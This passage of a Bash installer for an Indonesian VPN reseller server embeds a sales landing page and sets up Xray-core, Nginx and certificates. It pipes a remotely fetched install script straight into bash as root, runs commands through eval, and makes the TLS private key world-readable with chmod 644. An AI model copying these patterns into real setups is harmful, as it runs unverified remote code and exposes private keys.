  color: var(--primary);



}



.faq-answer {



  max-height: 0;



  overflow: hidden;



  transition: max-height 0.3s ease, padding 0.3s ease;



  padding: 0 24px;



  font-size: 14px;



  color: var(--text-dim);



  line-height: 1.7;



}



.faq-item.active .faq-answer {



  max-height: 200px;



  padding: 0 24px 20px;



}







/* Contact */



.contact-grid {



  display: grid;



  grid-template-columns: 1fr 1fr;



  gap: 40px;



  align-items: start;



}



@media (max-width: 768px) {



  .contact-grid { grid-template-columns: 1fr; }



}



.contact-info h3 {



  font-size: 20px;



  font-weight: 600;



  color: var(--text-bright);



  margin-bottom: 16px;



}



.contact-info p {



  font-size: 14px;



  color: var(--text-dim);



  line-height: 1.7;



  margin-bottom: 24px;



}



.contact-links {



  display: flex;



  flex-direction: column;



  gap: 12px;



}



.contact-link {



  display: flex;



  align-items: center;



  gap: 12px;



  padding: 14px 18px;



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius-sm);



  text-decoration: none;



  color: var(--text);



  font-size: 14px;



  transition: all 0.2s;



}



.contact-link:hover {



  background: var(--surface-hover);



  border-color: var(--border-hover);



  transform: translateX(4px);



}



.contact-link-icon {



  font-size: 20px;



  width: 32px;



  text-align: center;



}







/* Footer */



.footer {



  border-top: 1px solid var(--border);



  padding: 40px 0;



  margin-top: 40px;



}



.footer-content {



  display: flex;



  justify-content: space-between;



  align-items: center;



  flex-wrap: wrap;



  gap: 20px;



}



.footer-copy {



  font-size: 13px;



  color: var(--text-dim);



}



.footer-links {



  display: flex;



  gap: 20px;



}



.footer-links a {



  font-size: 13px;



  color: var(--text-dim);



  text-decoration: none;



  transition: color 0.2s;



}



.footer-links a:hover { color: var(--primary); }







/* Mobile */



@media (max-width: 768px) {



  .nav-links {



    display: none;



    position: absolute;



    top: 100%;



    left: 0; right: 0;



    flex-direction: column;



    padding: 16px 24px;



    background: rgba(8,8,26,0.95);



    backdrop-filter: blur(20px);



    border-bottom: 1px solid var(--border);



  }



  .nav-links.open { display: flex; }



  .mobile-toggle { display: block; }



  .hero-stats { flex-wrap: wrap; gap: 20px; }



  .pricing-card.featured { transform: none; }



}



</style>



</head>



<body>



<div id="bg-glow">



  <div class="orb orb-1"></div>



  <div class="orb orb-2"></div>



  <div class="orb orb-3"></div>



</div>



<div id="grid-overlay"></div>







<!-- Nav -->



<nav class="nav" role="navigation" aria-label="Navigasi utama">



  <div class="container">



    <a href="#" class="nav-logo">



      <div class="nav-logo-icon">&#x1F6E1;</div>



      PAGE_TITLE



    </a>



    <button class="mobile-toggle" onclick="this.nextElementSibling.classList.toggle('open')" aria-label="Toggle menu">&#9776;</button>



    <ul class="nav-links">



      <li><a href="#paket">Paket</a></li>



      <li><a href="#fitur">Fitur</a></li>



      <li><a href="#protokol">Protokol</a></li>



      <li><a href="#faq">FAQ</a></li>



      <li><a href="#kontak">Kontak</a></li>



      <li><a href="#order" class="nav-cta">Order Sekarang</a></li>



    </ul>



  </div>



</nav>







<!-- Hero -->



<section class="hero" id="home">



  <div class="container">



    <div class="hero-content">



      <div class="hero-badge">



        <span class="dot"></span>



        Server Online 24/7



      </div>



      <h1>Internet Cepat &amp; Aman<br>dengan <span>VPN Premium</span></h1>



      <p>Nikmati koneksi internet tanpa batas dengan teknologi Xray-core terbaru. Multi-protokol, anti-blokir, dan siap digunakan di semua perangkat.</p>



      <div class="hero-cta">



        <a href="#paket" class="btn btn-primary">&#x1F48E; Lihat Paket</a>



        <a href="#kontak" class="btn btn-secondary">&#x1F4AC; Hubungi Kami</a>



      </div>



      <div class="hero-stats">



        <div class="hero-stat">



          <div class="hero-stat-value">99.9%</div>



          <div class="hero-stat-label">Uptime</div>



        </div>



        <div class="hero-stat">



          <div class="hero-stat-value">5+</div>



          <div class="hero-stat-label">Protokol</div>



        </div>



        <div class="hero-stat">



          <div class="hero-stat-value">24/7</div>



          <div class="hero-stat-label">Support</div>



        </div>



        <div class="hero-stat">



          <div class="hero-stat-value">1Gbps</div>



          <div class="hero-stat-label">Speed</div>



        </div>



      </div>



    </div>



  </div>



</section>







<!-- Pricing -->



<section class="section" id="paket">



  <div class="container section-center">



    <div class="section-label">&#x1F4B0; Harga</div>



    <h2 class="section-title">Pilih Paket Sesuai Kebutuhan</h2>



    <p class="section-desc">Semua paket sudah termasuk dukungan multi-protokol, server stabil, dan garansi 24/7.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;margin-top:40px;">



      <div class="pricing-card">



        <div class="pricing-name">&#x1F331; Starter</div>



        <div class="pricing-price">Rp25K <span>/bulan</span></div>



        <div class="pricing-desc">Cocok untuk pemula yang ingin mencoba VPN premium.</div>



        <ul class="pricing-features">



          <li>1 Akun SSH/VPN</li>



          <li>Semua Protokol</li>



          <li>Kuota 50GB</li>



          <li>Speed 100Mbps</li>



          <li>Support Standar</li>



        </ul>



        <a href="#kontak" class="btn btn-secondary pricing-btn">Pilih Paket</a>



      </div>



      <div class="pricing-card featured">



        <div class="pricing-badge">Terpopuler</div>



        <div class="pricing-name">&#x1F680; Pro</div>



        <div class="pricing-price">Rp50K <span>/bulan</span></div>



        <div class="pricing-desc">Untuk pengguna yang membutuhkan koneksi lebih stabil dan cepat.</div>



        <ul class="pricing-features">



          <li>3 Akun SSH/VPN</li>



          <li>Semua Protokol</li>



          <li>Kuota 150GB</li>



          <li>Speed 500Mbps</li>



          <li>Support Prioritas</li>



        </ul>



        <a href="#kontak" class="btn btn-primary pricing-btn">Pilih Paket</a>



      </div>



      <div class="pricing-card">



        <div class="pricing-name">&#x1F451; Enterprise</div>



        <div class="pricing-price">Rp100K <span>/bulan</span></div>



        <div class="pricing-desc">Solusi maksimal untuk power user dan tim.</div>



        <ul class="pricing-features">



          <li>5+ Akun SSH/VPN</li>



          <li>Semua Protokol</li>



          <li>Kuota Unlimited</li>



          <li>Speed 1Gbps</li>



          <li>Support VIP 24/7</li>



        </ul>



        <a href="#kontak" class="btn btn-secondary pricing-btn">Pilih Paket</a>



      </div>



    </div>



  </div>



</section>







<!-- Features -->



<section class="section" id="fitur">



  <div class="container section-center">



    <div class="section-label">&#x2728; Fitur</div>



    <h2 class="section-title">Mengapa Memilih Kami?</h2>



    <p class="section-desc">Kami menyediakan layanan VPN terbaik dengan fitur-fitur unggulan untuk kenyamanan Anda.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;">



      <div class="feature-card">



        <div class="feature-icon">&#x1F6E1;</div>



        <h3>Keamanan Maksimal</h3>



        <p>Dilindungi dengan enkripsi TLS 1.3, teknologi Xray-core, dan firewall otomatis anti-DDoS.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x26A1;</div>



        <h3>Kecepatan Tinggi</h3>



        <p>Server dengan koneksi 1Gbps, optimasi TCP, dan dukungan WebSocket + gRPC untuk latency rendah.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F504;</div>



        <h3>Multi Protokol</h3>



        <p>Dukung SSH, VMess, VLess, Trojan dengan transport WebSocket, gRPC, dan TLS/HTTPS.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F4E1;</div>



        <h3>Server Stabil</h3>



        <p>Uptime 99.9% dengan monitoring otomatis, auto-restart, dan backup konfigurasi berkala.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F4AC;</div>



        <h3>Support 24/7</h3>



        <p>Tim support siap membantu via Telegram kapan saja. Garansi server aktif dan respons cepat.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F310;</div>



        <h3>Anti Blokir</h3>



        <p>Teknologi WebSocket dan HTTP CONNECT memungkinan bypass Internet Positif dengan mudah.</p>



      </div>



    </div>



  </div>



</section>







<!-- Protocols -->



<section class="section" id="protokol">



  <div class="container section-center">



    <div class="section-label">&#x1F4F6; Protokol</div>



    <h2 class="section-title">Protokol yang Didukung</h2>



    <p class="section-desc">Berbagai pilihan protokol VPN untuk menunjang kebutuhan koneksi Anda.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;">



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F4BB;</div>



        <h3>SSH</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">Port 22, 222</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F310;</div>



        <h3>VMess</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">WS:8080, gRPC:8444</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F30D;</div>



        <h3>VLess</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">WS:8081, gRPC:8445</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F6E1;</div>



        <h3>Trojan</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">WS:8082, gRPC:8446</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F4F6;</div>



        <h3>WebSocket</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">TLS:443, NonTLS:80</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F4C8;</div>



        <h3>gRPC</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">TLS:443, NonTLS:80</p>



      </div>



    </div>



  </div>



</section>







<!-- Testimonials -->



<section class="section" id="testimonial">



  <div class="container section-center">



    <div class="section-label">&#x2B50; Testimonial</div>



    <h2 class="section-title">Apa Kata Pelanggan</h2>



    <p class="section-desc">Pengalaman nyata dari pengguna setia Youzin Crabz Tunnel.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;">



      <div class="testimonial-card">



        <div class="testimonial-stars">&#9733; &#9733; &#9733; &#9733; &#9733;</div>



        <div class="testimonial-text">"Koneksi sangat stabil dan cepat. Setelah pakai sini, saya gak pindah-pindah lagi. Recommended!"</div>



        <div class="testimonial-author">



          <div class="testimonial-avatar">A</div>



          <div>



            <div class="testimonial-name">Andi Pratama</div>



            <div class="testimonial-role">Pelanggan Pro (6 bulan)</div>



          </div>



        </div>



      </div>



      <div class="testimonial-card">



        <div class="testimonial-stars">&#9733; &#9733; &#9733; &#9733; &#9733;</div>



        <div class="testimonial-text">"Supportnya fast respon banget. Ada masalah langsung dibantu. Server juga jarang down."</div>



        <div class="testimonial-author">



          <div class="testimonial-avatar">S</div>



          <div>



            <div class="testimonial-name">Siti Rahma</div>



            <div class="testimonial-role">Pelanggan Enterprise</div>



          </div>



        </div>



      </div>



      <div class="testimonial-card">



        <div class="testimonial-stars">&#9733; &#9733; &#9733; &#9733; &#9733;</div>



        <div class="testimonial-text">"Harganya worth it banget dengan kualitas yang didapat. Multi protokol bikin fleksibel."</div>



        <div class="testimonial-author">



          <div class="testimonial-avatar">R</div>



          <div>



            <div class="testimonial-name">Rudi Hermawan</div>



            <div class="testimonial-role">Pelanggan Starter</div>



          </div>



        </div>



      </div>



    </div>



  </div>



</section>







<!-- FAQ -->



<section class="section" id="faq">



  <div class="container section-center">



    <div class="section-label">&#x2753; FAQ</div>



    <h2 class="section-title">Pertanyaan Umum</h2>



    <p class="section-desc">Temukan jawaban untuk pertanyaan yang sering diajukan.</p>



  </div>



  <div class="container">



    <div class="faq-list">



      <div class="faq-item">



        <div class="faq-question">Apa itu Youzin Crabz Tunnel?</div>



        <div class="faq-answer">Layanan VPN premium berbasis Xray-core yang mendukung berbagai protokol seperti VMess, VLess, Trojan, dan SSH dengan koneksi WebSocket dan gRPC.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Bagaimana cara melakukan order?</div>



        <div class="faq-answer">Hubungi admin melalui Telegram, pilih paket yang diinginkan, lakukan pembayaran, dan akun akan dibuat dalam waktu singkat setelah konfirmasi.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Apakah bisa digunakan di HP dan PC?</div>



        <div class="faq-answer">Ya, layanan kami mendukung semua perangkat dan platform. Tersedia panduan konfigurasi untuk berbagai aplikasi seperti V2Ray, HTTP Custom, KPN Tunnel, dan lainnya.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Apakah ada garansi server?</div>



        <div class="faq-answer">Kami menyediakan garansi server online 24/7 dengan monitoring otomatis. Jika ada masalah, tim support siap membantu melalui Telegram.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Metode pembayaran apa saja?</div>



        <div class="faq-answer">Kami menerima berbagai metode pembayaran seperti transfer bank (BCA, Mandiri, BRI), e-wallet (GoPay, OVO, DANA), dan pulsa XL/Telkomsel.</div>



      </div>



    </div>



  </div>



</section>







<!-- Server Status -->



<section class="section" id="status">



  <div class="container section-center">



    <div class="section-label">&#x1F4CA; Status</div>



    <h2 class="section-title">Status Server</h2>



    <p class="section-desc">Pantau kondisi layanan kami secara real-time.</p>



  </div>



  <div class="container">



    <div class="status-grid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;">



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4E1;</div>



        <h3 style="font-size:13px;margin:0;">XRAY</h3>



        <div class="status-dot on" id="status-xray"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F5A5;</div>



        <h3 style="font-size:13px;margin:0;">NGINX</h3>



        <div class="status-dot on" id="status-nginx"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4E6;</div>



        <h3 style="font-size:13px;margin:0;">HAPROXY</h3>



        <div class="status-dot on" id="status-haproxy"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4F1;</div>



        <h3 style="font-size:13px;margin:0;">DROPBEAR</h3>



        <div class="status-dot on" id="status-dropbear"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4BB;</div>



        <h3 style="font-size:13px;margin:0;">SSH</h3>



        <div class="status-dot on" id="status-ssh"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F30D;</div>



        <h3 style="font-size:13px;margin:0;">UDP CUSTOM</h3>



        <div class="status-dot on" id="status-udp"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



    </div>



  </div>



</section>







<style>



.status-dot {



  width: 12px;



  height: 12px;



  border-radius: 50%;



  display: inline-block;



}



.status-dot.on {



  background: var(--accent);



  box-shadow: 0 0 8px rgba(16,185,129,0.5);



  animation: pulse 2s infinite;



}



.status-dot.off {



  background: #ef4444;



  box-shadow: 0 0 8px rgba(239,68,68,0.5);



}



</style>







<!-- Contact -->



<section class="section" id="kontak">



  <div class="container section-center">



    <div class="section-label">&#x1F4E9; Kontak</div>



    <h2 class="section-title">Hubungi Kami</h2>



    <p class="section-desc">Silakan hubungi kami melalui kontak di bawah ini untuk order, pertanyaan, atau bantuan teknis.</p>



  </div>



  <div class="container">



    <div style="max-width:600px;margin:0 auto;">



      <div style="display:flex;flex-direction:column;gap:12px;">



        <a href="https://t.me/youzin_crabz" class="contact-link" target="_blank" rel="noopener">



          <span class="contact-link-icon">&#x2709;</span>



          <span><strong>Telegram:</strong> @youzin_crabz</span>



        </a>



        <a href="mailto:support@youzin-crabz.com" class="contact-link">



          <span class="contact-link-icon">&#x1F4E7;</span>



          <span><strong>Email:</strong> support@youzin-crabz.com</span>



        </a>



        <a href="#" class="contact-link" onclick="return false;">



          <span class="contact-link-icon">&#x1F4DE;</span>



          <span><strong>WhatsApp:</strong> +62-xxx-xxxx-xxxx</span>



        </a>



      </div>



    </div>



  </div>



</section>







<!-- Order CTA -->



<section class="section" id="order" style="padding:60px 0;">



  <div class="container section-center">



    <div style="background:linear-gradient(135deg,var(--primary-dim),var(--secondary-dim));border-radius:var(--radius);padding:48px;border:1px solid rgba(0,212,255,0.2);">



      <h2 style="font-size:28px;font-weight:700;color:var(--text-bright);margin-bottom:12px;">Siap Memulai?</h2>



      <p style="font-size:16px;color:var(--text-dim);max-width:500px;margin:0 auto 28px;">Jangan tunggu lagi! Dapatkan akses internet cepat, aman, dan tanpa batas sekarang juga.</p>



      <a href="https://t.me/youzin_crabz" class="btn btn-primary" target="_blank" rel="noopener">&#x1F4AC; Order via Telegram</a>



    </div>



  </div>



</section>







<!-- Footer -->



<footer class="footer">



  <div class="container">



    <div class="footer-content">



      <div class="footer-copy">&copy; 2026 PAGE_TITLE. All rights reserved.</div>



      <div class="footer-links">



        <a href="#home">Home</a>



        <a href="#paket">Paket</a>



        <a href="#fitur">Fitur</a>



        <a href="#faq">FAQ</a>



        <a href="#kontak">Kontak</a>



      </div>



    </div>



  </div>



</footer>







<!-- Status checker -->



<script>



// FAQ Toggle



var faqItems = document.querySelectorAll(".faq-item");



faqItems.forEach(function(item) {



  item.addEventListener("click", function() {



    this.classList.toggle("active");



  });



});







// Service status auto-refresh



function checkStatus() {



  var statusDiv = document.querySelector(".status-grid");



  if (!statusDiv) return;



  fetch('/status.json?' + new Date().getTime())



    .then(function(r) { return r.json(); })



    .then(function(data) {



      for (var key in data) {



        var el = document.getElementById('status-' + key.toLowerCase());



        if (el) {



          el.className = data[key] === 'active' ? 'status-dot on' : 'status-dot off';



          el.nextElementSibling.textContent = data[key] === 'active' ? 'Online' : 'Offline';



        }



      }



    })



    .catch(function() {});



}



setInterval(checkStatus, 30000);



checkStatus();







// Nav scroll effect



window.addEventListener("scroll", function() {



  var nav = document.querySelector(".nav");



  if (window.scrollY > 50) {



    nav.style.background = "rgba(8,8,26,0.95)";



  } else {



    nav.style.background = "rgba(8,8,26,0.8)";



  }



});







// Close mobile menu on link click



document.querySelectorAll(".nav-links a").forEach(function(link) {



  link.addEventListener("click", function() {



    document.querySelector(".nav-links").classList.remove("open");



  });



});



</script>



</body>



</html>



WEBEOF



    # Sedang untuk mengganti placeholder



    sed -i "s|PAGE_TITLE|${PAGE_TITLE}|g" "$PUBLIC_HTML/index.html"



    sed -i "s|PAGE_DESC|${PAGE_DESC}|g" "$PUBLIC_HTML/index.html"



    sed -i "s|SITE_URL|${SITE_URL}|g" "$PUBLIC_HTML/index.html"



    sed -i "s|GA_ID||g" "$PUBLIC_HTML/index.html"



    sed -i "s|GOOGLE_VERIFICATION||g" "$PUBLIC_HTML/index.html"







    rm -f /var/www/html/index.nginx-debian.html /var/www/html/50x.html /var/www/html/index.htm 2>/dev/null



    chown -R www-data:www-data "$PUBLIC_HTML" 2>/dev/null || chown -R root:root "$PUBLIC_HTML" 2>/dev/null



    chmod 644 "$PUBLIC_HTML/index.html"



    chmod 644 "$PUBLIC_HTML/robots.txt"



    chmod 644 "$PUBLIC_HTML/sitemap.xml"



    echo -e "  ${GREEN}✔ Landing page berhasil dideploy!${NC}"



}



auto_install() {



    # Auto-copy script ke SCRIPT_PATH jika belum ada (biar menu command berfungsi)



    if [[ "$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "${BASH_SOURCE[0]}")" != "$SCRIPT_PATH" ]] && [[ ! -f "$SCRIPT_PATH" ]]; then



        cp "${BASH_SOURCE[0]}" "$SCRIPT_PATH" 2>/dev/null



        chmod +x "$SCRIPT_PATH" 2>/dev/null



        echo -e "  ${GREEN}✔ Script di-copy ke ${SCRIPT_PATH}${NC}"



        sleep 1



    fi



    show_install_banner



    setup_domain



    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain kosong!${NC}"; exit 1; }







    local domain_type="custom"



    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")







    clear; show_install_banner



    echo -e "  ${WHITE}Domain   :${NC} ${GREEN}${DOMAIN}${NC}"



    echo -e "  ${WHITE}SSL Type :${NC} ${GREEN}$([[ "$domain_type" == "custom" ]] && echo "Let's Encrypt" || echo "Self-Signed")${NC}"



    echo ""







    animated_loading "Mempersiapkan instalasi" 2



    echo ""







    local total=10 step=0 LOG="/tmp/install.log"



    true > "$LOG"







    _ok()   { printf "  ${GREEN}✔${NC}  %-45s\n" "$1"; }



    _fail() { printf "  ${RED}✘${NC}  %-45s\n" "$1"; }







    _head() {



        echo ""



        printf "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"



        printf "  ${YELLOW}  STEP %d/%d${NC}  ${WHITE}%s${NC}\n" "$2" "$3" "$1"



        printf "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"



        echo ""



    }







    _pkg() {



        local pkg="$1" sp=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏') i=0



        DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >> "$LOG" 2>&1 &



        local pid=$!



        while kill -0 $pid 2>/dev/null; do



            printf "\r  ${CYAN}${sp[$((i % 10))]}${NC}  Installing %-30s" "${pkg}..."



            sleep 0.08; ((i++))



        done



        wait $pid



        [[ $? -eq 0 ]] && printf "\r  ${GREEN}✔${NC}  %-40s\n" "$pkg" || printf "\r  ${RED}✘${NC}  %-40s\n" "$pkg (gagal)"



    }







    _run() {



        local label="$1" cmd="$2" sp=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏') i=0



        # SAFE: $cmd berasal dari hardcoded string internal, bukan user input
    eval "$cmd" >> "$LOG" 2>&1 &



        local pid=$!



        while kill -0 $pid 2>/dev/null; do



            printf "\r  ${CYAN}${sp[$((i % 10))]}${NC}  %-45s" "${label}..."



            sleep 0.08; ((i++))



        done



        wait $pid



        local ret=$?



        [[ $ret -eq 0 ]] && printf "\r  ${GREEN}✔${NC}  %-45s\n" "$label" || printf "\r  ${RED}✘${NC}  %-45s\n" "$label (gagal)"



        return $ret



    }







    # ── TIMEZONE: Tanya user sesuai wilayah ──



    echo ""



    local W_tz; W_tz=$(get_width)



    _box_top $W_tz



    _box_center $W_tz "${YELLOW}${BOLD}PILIH TIMEZONE${NC}"



    _box_divider $W_tz



    echo -e "  Pilih timezone sesuai wilayah Anda:\n"



    echo -e "  ${CYAN}[1]${NC} WIB  — Asia/Jakarta   (UTC+7) — Jawa, Sumatra, Kal-Bar"



    echo -e "  ${CYAN}[2]${NC} WITA — Asia/Makassar  (UTC+8) — Kalimantan, Bali, Sulawesi"



    echo -e "  ${CYAN}[3]${NC} WIT  — Asia/Jayapura  (UTC+9) — Maluku, Papua"



    echo -e "  ${CYAN}[4]${NC} SGT  — Asia/Singapore (UTC+8) — Singapore"



    echo -e "  ${CYAN}[5]${NC} Lainnya (ketik manual)"



    _box_bottom $W_tz



    echo ""



    local tz_choice tz_zone=""



    while true; do



        read -rp "  Pilih timezone [1-5]: " tz_choice



        case $tz_choice in



            1) tz_zone="Asia/Jakarta"   ;;



            2) tz_zone="Asia/Makassar"  ;;



            3) tz_zone="Asia/Jayapura"  ;;



            4) tz_zone="Asia/Singapore" ;;



            5) read -rp "  Ketik timezone: " tz_zone ;;



            *) echo -e "  ${RED}Pilih 1-5!${NC}"; continue ;;



        esac



        [[ -n "$tz_zone" ]] && break



    done



    if timedatectl set-timezone "$tz_zone" 2>/dev/null; then



        _ok "Timezone: ${tz_zone}"



    else



        timedatectl set-timezone Asia/Jakarta 2>/dev/null || true



        _ok "Timezone fallback: Asia/Jakarta (WIB)"



    fi



    # NTP sync — chrony untuk akurasi jam terbaik



    timedatectl set-ntp true 2>/dev/null || true



    command -v chronyc >/dev/null 2>&1 || apt-get install -y chrony >/dev/null 2>&1 || true



    systemctl enable chrony 2>/dev/null; systemctl restart chrony 2>/dev/null || true



    hwclock --systohc 2>/dev/null || true



    _ok "Waktu server: $(date '+%d %b %Y %H:%M:%S %Z')"







    ((step++)); show_progress $step $total "System Update"



    _head "System Update" $step $total



    _wait_apt_lock



    # Stop unattended-upgrades agar apt tidak locked



    systemctl stop unattended-upgrades 2>/dev/null || true



    _run "apt-get update" "apt-get update -y"



    _run "apt-get upgrade" "DEBIAN_FRONTEND=noninteractive apt-get upgrade -y -o Dpkg::Options::='--force-confdef' -o Dpkg::Options::='--force-confold'"







    ((step++)); show_progress $step $total "Installing Base Packages"



    _head "Base Packages" $step $total



    for pkg in curl wget unzip uuid-runtime net-tools openssl jq python3 python3-pip software-properties-common ca-certificates gnupg lsb-release qrencode netcat-openbsd; do _pkg "$pkg"; done







    ((step++)); show_progress $step $total "Installing VPN Services"



    _head "VPN Services" $step $total



    detect_ubuntu_version



    for pkg in nginx openssh-server dropbear haproxy; do _pkg "$pkg"; done



    # certbot diinstall terpisah via install_certbot_compat







    ((step++)); show_progress $step $total "Installing Xray-Core"



    _head "Xray Core" $step $total



    # Install Xray versi terbaru langsung (skip versi lama yg sering gagal)



    local xray_installed=0



        echo -e "  ${YELLOW}Menginstall Xray-Core...${NC}"

        if bash <(curl -Ls --max-time 120 --retry 2 https://github.com/XTLS/Xray-install/raw/main/install-release.sh) >> "$LOG" 2>&1; then
            xray_installed=1
        else
            # Fallback: direct binary download dari GitHub releases
            echo -e "  ${YELLOW}Install script gagal, mencoba direct binary download...${NC}"
            command -v unzip >/dev/null 2>&1 || apt-get install -y unzip >/dev/null 2>&1 || true
            local xray_latest=$(curl -sL --max-time 30 https://api.github.com/repos/XTLS/Xray-core/releases/latest 2>/dev/null | grep '"tag_name"' | head -1 | sed 's/.*"\([^"]*\)".*/\1/')
            if [[ -n "$xray_latest" ]]; then
                local xray_url="https://github.com/XTLS/Xray-core/releases/download/${xray_latest}/Xray-linux-64.zip"
                if curl -L --max-time 120 --retry 2 -o /tmp/xray.zip "$xray_url" 2>/dev/null; then
                    unzip -o /tmp/xray.zip -d /tmp/xray-tmp >/dev/null 2>&1
                    if [[ -f /tmp/xray-tmp/xray ]]; then
                        cp /tmp/xray-tmp/xray /usr/local/bin/xray
                        chmod +x /usr/local/bin/xray
                        mkdir -p /var/log/xray /usr/local/etc/xray
                        # Install systemd service
                        if [[ -f /tmp/xray-tmp/systemd/system/xray.service ]]; then
                            cp /tmp/xray-tmp/systemd/system/xray.service /etc/systemd/system/
                        else
                            cat > /etc/systemd/system/xray.service << 'XRAYUNIT'
[Unit]
Description=Xray Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/bin/xray run -config /usr/local/etc/xray/config.json
Restart=on-failure
[Install]
WantedBy=multi-user.target
XRAYUNIT
                        fi
                        systemctl daemon-reload
                        xray_installed=1
                        echo -e "  ${GREEN}✔${NC} Xray direct binary installed" >> "$LOG"
                    fi
                    rm -rf /tmp/xray.zip /tmp/xray-tmp
                fi
            fi
        fi



    mkdir -p "$AKUN_DIR" /var/log/xray /usr/local/etc/xray "$PUBLIC_HTML" "$ORDER_DIR" /root/bot "$TUNNELBOT_DIR"



    if command -v xray >/dev/null 2>&1; then



        _ok "Xray installed: $(xray version 2>/dev/null | head -1)"



    else



        _fail "Xray install FAILED! Cek koneksi internet ke GitHub"



    fi







    ((step++)); show_progress $step $total "Setting up Swap Memory"



    _head "Swap Memory 1GB" $step $total



    local cur_swap; cur_swap=$(free -m | awk 'NR==3{print $2}')



    if [[ "$cur_swap" -lt 512 ]]; then



        _run "Creating swapfile 1GB" "fallocate -l 1G /swapfile || dd if=/dev/zero of=/swapfile bs=1M count=1024"



        chmod 600 /swapfile; mkswap /swapfile >/dev/null 2>&1; swapon /swapfile



        grep -q "/swapfile" /etc/fstab || echo "/swapfile none swap sw 0 0" >> /etc/fstab



        _ok "Swap 1GB active"



    else



        _ok "Swap exists (${cur_swap}MB), skip"



    fi







    ((step++)); show_progress $step $total "Getting SSL Certificate"



    _head "SSL Certificate" $step $total



    mkdir -p /etc/xray



    if [[ "$domain_type" == "custom" ]]; then



        # Stop services yang pakai port 80



        systemctl stop nginx haproxy 2>/dev/null



        sleep 1



        install_certbot_compat "custom"



        if command -v certbot >/dev/null 2>&1; then



            _run "Certbot Let's Encrypt" "certbot certonly --standalone -d '$DOMAIN' --non-interactive --agree-tos --register-unsafely-without-email --timeout 60"



        fi



        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt



            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



            _ok "Let's Encrypt cert installed"



        else



            _run "Generating self-signed cert" \
                "openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -subj '/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN}' -keyout /etc/xray/xray.key -out /etc/xray/xray.crt"



            _ok "Self-signed cert generated (certbot gagal/tidak tersedia)"



        fi



    else



        _run "Generating self-signed cert" \
            "openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -subj '/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN}' -keyout /etc/xray/xray.key -out /etc/xray/xray.crt"



        _ok "Self-signed cert for $DOMAIN"



    fi



    chmod 644 /etc/xray/xray.* 2>/dev/null







    ((step++)); show_progress $step $total "Creating Configs"



